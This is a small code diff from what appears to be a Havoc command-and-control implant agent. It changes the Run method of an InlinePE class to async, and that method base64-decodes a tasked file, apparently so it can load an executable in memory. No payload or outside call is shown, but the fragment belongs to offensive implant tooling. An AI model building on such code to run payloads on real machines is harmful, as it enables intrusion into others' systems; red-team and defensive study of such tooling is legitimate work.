@@ -66,7 +66,7 @@ namespace HavocImplant.AgentFunctions
         public InlinePE() // For initial loading
         {
         }
-        public override void Run(int taskId)
+        public override async Task Run(int taskId)
         {
 
             rawbytes = Convert.FromBase64String(Agent.taskingInformation[taskId].taskFile);
